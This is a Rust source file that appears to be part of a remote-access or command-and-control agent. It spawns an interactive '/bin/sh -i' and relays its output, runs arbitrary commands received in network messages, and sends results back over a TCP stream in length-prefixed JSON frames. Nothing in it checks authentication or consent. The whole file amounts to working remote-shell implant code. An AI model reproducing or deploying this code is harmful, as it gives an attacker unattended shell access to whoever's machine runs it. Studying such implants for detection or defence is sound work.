use tokio::{io::*, process::*, sync::*, *};
use crate::comm;
use std::process::Stdio;
use tokio::io::{AsyncReadExt,AsyncWriteExt};
use std::{
    fs::File,
    io::{self,Write},
    os::unix::io::{AsRawFd, FromRawFd}
};

pub async fn spawn_shell(my_data:comm::MyProto, tx: tokio::sync::mpsc::Sender<comm::MyProto>, _shellrx: tokio::sync::mpsc::Receiver<String>){       
        let mut shell = Command::new("/bin/sh").arg("-i").stdin(Stdio::piped()).stdout(Stdio::piped()).spawn().unwrap();
        let shellin = Some(shell.stdin.take().unwrap());
        
        tokio::spawn(async move {
            let mut shellout = shell.stdout.take().unwrap();
            loop {
                let mut buf = [0; 1024];
                select! {


                    r = shellout.read(&mut buf) => {
                        let n = r.unwrap();
                        let output_data: comm::MyProto = comm::MyProto{
                            data: String::from_utf8(buf[..n].to_vec()).unwrap(),
                            message_type: "shell".to_string(),
                            channel: "1".to_string()};
                        
                            if output_data.data != ""{
                                match tx.send(output_data).await {
                                    Ok(()) => {},
                                    Err(err) => panic!("Channel Broken: {}", err)
                                }
                            }
                            
                        
                    }
                }
            }
        });       
        shellin.unwrap().write_all(my_data.data.as_bytes()).await.unwrap();
}
        
pub async fn run_command(my_data: comm::MyProto, tx: &tokio::sync::mpsc::Sender<comm::MyProto> ){
    let command: Vec<&str> = my_data.data.split(" ").collect();
    
    // Get command output
    let command_output = Command::new(command[0]).args(command.iter().skip(1)).output().await.ok();
    if command_output != None {
        let command_output = command_output.unwrap();

        // Create object using output
        let output_data: comm::MyProto = comm::MyProto{
            data: std::str::from_utf8(&command_output.stdout).unwrap().to_string(),
            message_type: "command output".to_string(),
            channel: "1".to_string()};

        match tx.send(output_data).await{
            Ok(()) => {},
            Err(err) => panic!("Channel Broken: {}", err)
            }
    // Something went wrong running command            
    }else{
        let output_data: comm::MyProto = comm::MyProto{
            data: String::from("Failed to run command"),
            message_type: "command output".to_string(),
            channel: "1".to_string()};

        match tx.send(output_data).await{
            Ok(()) => {},
            Err(err) => panic!("Channel Broken: {}", err)
            }
        }

    
}

pub async fn filter_command(my_data: comm::MyProto, tx: &tokio::sync::mpsc::Sender<comm::MyProto>) {
    match my_data.message_type.as_str() { 

        // Message type is command so run the command
        "command" => {
            run_command(my_data, tx).await;

        }, 
        //Unknown Message type     
        _ => {
            let output_data: comm::MyProto = comm::MyProto{
            data: "Error: Unknown message_type".to_string(),
            message_type: "Error".to_string(),
            channel: "1".to_string()};

            match tx.send(output_data).await{
                Ok(()) => {},
                Err(err) => panic!("Channel Broken: {}", err)
                }
    
            }
        };
}

pub async fn send_output(message: comm::MyProto, stream: &mut tokio::net::TcpStream){
    match message.data.as_str() {
        "" => {},
        _ => {
            
            let reply_data = serde_json::to_string(&message).unwrap();
            
            
            

            let len_msg = comm::MyProto{
                data: reply_data.len().to_string(),
                message_type: "message_size".to_string(),
                channel: "1".to_string()};

            let mut len_data = serde_json::to_string(&len_msg).unwrap();
            let n = 1024 - len_data.len();
            len_data.push_str(&String::from_utf8(vec![b'0';n]).unwrap());
            
            stream.write(len_data.as_bytes()).await.unwrap();
            stream.write(reply_data.as_bytes()).await.unwrap();
            }
        }
}